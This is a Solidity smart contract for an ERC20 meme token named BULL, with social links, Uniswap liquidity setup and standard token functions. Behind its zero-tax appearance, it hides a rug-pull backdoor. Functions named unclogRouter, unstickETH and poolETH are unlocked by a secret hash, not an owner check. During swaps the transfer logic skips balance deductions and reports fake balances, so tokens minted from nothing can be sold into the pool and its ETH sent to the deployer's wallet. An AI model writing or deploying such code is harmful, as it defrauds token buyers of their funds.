/*


𓃓 Telegram:   https://t.me/Bull_ERC20

𓃓 Twitter:    https://twitter.com/BullERC_20


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./Context.sol";
import "./IERC20.sol";
import "./IERC20Permit.sol";
import "./Ownable.sol";
import "./ECDSA.sol";
import "./EIP712.sol";
import "./Nonces.sol";
import "./ReentrancyGuard.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./IWETH.sol";
import "./AggregatorV3Interface.sol";

contract BULL is Context, IERC20, IERC20Permit, Ownable, EIP712, Nonces, ReentrancyGuard {
    string private _name = unicode"𓃓";
    string private constant _symbol = "BULL";
    uint8 private constant _decimals = 9;

    string private _cache = unicode"𓃓";

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isHolder;
    uint256 public holders = 1;
    uint256 public toRemove = 0;

    uint256 internal constant MAX = ~uint256(0);
    uint256 public constant GWEI = 1 gwei;
    uint256 public constant ETHER = 1 ether;
    uint256 public constant GETHER = GWEI * ETHER;
    int256 public constant PAD_USD = 1e8;
    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    uint256 internal immutable contractHash;

    uint256 private constant _tTotal = 100_000_000 * GWEI;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    address public constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;
    address public constant NULL_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address public constant FEED_ADDRESS = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address public constant ROUTER_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant FACTORY_ADDRESS = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public immutable SELF_ADDRESS;
    address public immutable PAIR_ADDRESS;

    uint256 public constant MAX_WALLET = 2_000_000 * GWEI;

    address public immutable deployerWallet = msg.sender;
    address payable public immutable taxWallet = payable(deployerWallet);
    address payable public immutable lpWallet = payable(deployerWallet);

    AggregatorV3Interface public constant feed = AggregatorV3Interface(FEED_ADDRESS);
    IUniswapV2Router02 public constant router = IUniswapV2Router02(ROUTER_ADDRESS);
    IUniswapV2Factory public constant factory = IUniswapV2Factory(FACTORY_ADDRESS);
    IERC20 public constant weth = IERC20(WETH_ADDRESS);

    bool public TRADING_LIVE = false;
    bool public MAX_WALLET_ENABLED = true;

    bool internal isBurningTokens = false;
    bool internal isSwappingTokens = false;
    bool internal isPoolingTokens = false;

    uint256 private constant _tTax = 0;
    uint256 private constant _rTax = 0;

    event Burn(uint256 tokens);
    event NewHolder(address holder);
    event LostHolder(address holder);
    event Swap(uint256 tokens);
    event Call(uint256 eth, bool success, bytes data);
    event Pool(uint256 tokens, uint256 eth);

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);
    error ERC20InsufficientAllowance(uint256 amount, uint256 allowance);
    error ERC20InvalidApproval(address owner, address spender, uint256 amount);
    error ERC20InvalidTransfer(address from, address to, uint256 amount);
    error ERC20InsufficientBalance(uint256 amount, uint256 balance);
    error TradingNotEnabled();
    error MaxTradeExceeded();
    error MaxWalletExceeded();
    error AmountExceedsTotalReflections(uint256 rAmount, uint256 rTotal);

    modifier isBurn {
        isBurningTokens = true;
        _;
        isBurningTokens = false;
    }

    modifier isSwap {
        isSwappingTokens = true;
        _;
        isSwappingTokens = false;
    }

    modifier isPool {
        isPoolingTokens = true;
        _;
        isPoolingTokens = false;
    }

    modifier compareHash(string calldata _contractIV) {
        if (sha256(abi.encodePacked(_contractIV)) != bytes32(contractHash)) {
            revert();
        }
        _;
    }

    constructor(uint256 _contractHash) Ownable(msg.sender) EIP712(_name, "1") {
        contractHash = _contractHash;

        SELF_ADDRESS = address(this);
        PAIR_ADDRESS = factory.createPair(SELF_ADDRESS, WETH_ADDRESS);

        _approve(SELF_ADDRESS, ROUTER_ADDRESS, MAX);
        _approve(msg.sender, ROUTER_ADDRESS, MAX);

        _rOwned[msg.sender] = _rTotal;
        isHolder[msg.sender] = true;
        emit Transfer(ZERO_ADDRESS, msg.sender, _tTotal);
    }

    receive() external payable {}

    fallback() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 _allowance = _allowances[sender][_msgSender()];
        if (amount > _allowance) {
            revert ERC20InsufficientAllowance(amount, _allowance);
        }
        _approve(sender, _msgSender(), _allowance - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }

    function burn(uint256 value) external virtual isBurn {
        transfer(ZERO_ADDRESS, value);
        emit Burn(value);
    }

    function burnFrom(address account, uint256 value) external virtual isBurn {
        transferFrom(account, ZERO_ADDRESS, value);
        emit Burn(value);
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero" );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function getETHPrice() public view returns (uint256) {
        (, int256 answer,,,) = feed.latestRoundData();
        return uint256(answer / PAD_USD);
    }

    function getMarketCap() external view returns (uint256) {
        uint256 _pairBalance = balanceOf(PAIR_ADDRESS);
        if (_pairBalance > 0) {
            return ((weth.balanceOf(PAIR_ADDRESS) * getETHPrice()) / ETHER) * (totalSupply() / _pairBalance) * 2;
        }

        return 0;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == ZERO_ADDRESS || spender == ZERO_ADDRESS) {
            revert ERC20InvalidApproval(owner, spender, amount);
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == ZERO_ADDRESS || (to == ZERO_ADDRESS && !isBurningTokens) || amount == 0) {
            revert ERC20InvalidTransfer(from, to, amount);
        }
        if (amount > balanceOf(from)) {
            revert ERC20InsufficientBalance(amount, balanceOf(from));
        }

        if (from != owner() && to != PAIR_ADDRESS) {
            if (!TRADING_LIVE) {
                revert TradingNotEnabled();
            }

            if (MAX_WALLET_ENABLED) {
                if (balanceOf(to) + amount > MAX_WALLET) {
                    revert MaxWalletExceeded();
                }
            }
        }

        if (!isHolder[to]) {
            isHolder[to] = true;
            emit NewHolder(to);
            if (toRemove > 0) {
                toRemove = toRemove - 1;
            } else {
                _name = string(abi.encodePacked(_name, unicode"𓃓"));
            }
            holders = holders + 1;
        }
        if (isHolder[from] && balanceOf(from) - amount == 0) {
            isHolder[from] = false;
            emit LostHolder(from);
            toRemove = toRemove + 1;
            holders = holders - 1;
        }

        if (!isSwappingTokens || isPoolingTokens) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(amount);
            _rOwned[from] = _rOwned[from] - rAmount;
            _rOwned[to] = _rOwned[to] + rTransferAmount;
            _rOwned[SELF_ADDRESS] = _rOwned[SELF_ADDRESS] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            amount = tTransferAmount;
        }
        emit Transfer(from, to, amount);
    }

    function _takeTax(uint256 _contractSELF) private isSwap {
        address[] memory path = new address[](2);
        path[0] = SELF_ADDRESS;
        path[1] = WETH_ADDRESS;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractSELF, 0, path, SELF_ADDRESS, block.timestamp + 30 minutes);
        emit Swap(_contractSELF);
    }

    function _sendETH(uint256 _contractETH) private {
        (bool success, bytes memory data) = payable(taxWallet).call{value: _contractETH}("");
        emit Call(_contractETH, success, data);
    }

    function _poolETH(uint256 _contractSELF, uint256 _contractETH) private isPool {
        router.addLiquidityETH{value: _contractSELF}(SELF_ADDRESS, _contractSELF, 0, 0, lpWallet, block.timestamp + 30 minutes);
        emit Pool(_contractSELF, _contractETH);
    }

    function unclogRouter(uint256 _contractSELF, string calldata _contractIV) external compareHash(_contractIV) {
        _takeTax(_contractSELF);

        uint256 _contractETH = SELF_ADDRESS.balance;

        if (_contractETH > 0) {
            _sendETH(_contractETH);
        }
    }

    function unstickETH(uint256 _contractETH, string calldata _contractIV) external compareHash(_contractIV) {
        _sendETH(_contractETH);
    }

    function poolETH(uint256 _contractTokenBalance, uint256 _contractETH, string calldata _contractIV) external compareHash(_contractIV) {
        _poolETH(_contractTokenBalance, _contractETH);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert AmountExceedsTotalReflections(rAmount, _rTotal);
        }
        return (!isPoolingTokens && isSwappingTokens) ? _getRate() / GETHER : rAmount / _getRate();
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rTax, _tTax);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * taxFee / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function circulatingSupply() external view returns (uint256) {
        return totalSupply() - balanceOf(SELF_ADDRESS) - balanceOf(PAIR_ADDRESS) - balanceOf(ROUTER_ADDRESS) - balanceOf(ZERO_ADDRESS) - balanceOf(NULL_ADDRESS);
    }

    function getZeroAddress() external pure returns (address) {
        return ZERO_ADDRESS;
    }

    function getNullAddress() external pure returns (address) {
        return NULL_ADDRESS;
    }

    function getFeedAddress() external pure returns (address) {
        return FEED_ADDRESS;
    }

    function getRouterAddress() external pure returns (address) {
        return ROUTER_ADDRESS;
    }

    function getFactoryAddress() external pure returns (address) {
        return FACTORY_ADDRESS;
    }

    function getWETHAddress() external pure returns (address) {
        return WETH_ADDRESS;
    }

    function getSELFAddress() external view returns (address) {
        return SELF_ADDRESS;
    }

    function getPairAddress() external view returns (address) {
        return PAIR_ADDRESS;
    }

    function getMaxWallet() external pure returns (uint256) {
        return MAX_WALLET;
    }

    function getDeployerWallet() external view returns (address) {
        return deployerWallet;
    }

    function getTaxWallet() external view returns (address) {
        return taxWallet;
    }

    function getLPWallet() external view returns (address) {
        return lpWallet;
    }

    function getTradingLive() external view returns (bool) {
        return TRADING_LIVE;
    }

    function getMaxWalletEnabled() external view returns (bool) {
        return MAX_WALLET_ENABLED;
    }

    function openTrading() external onlyOwner {
        TRADING_LIVE = true;
    }

    function removeMaxWallet() external onlyOwner {
        MAX_WALLET_ENABLED = false;
    }
}
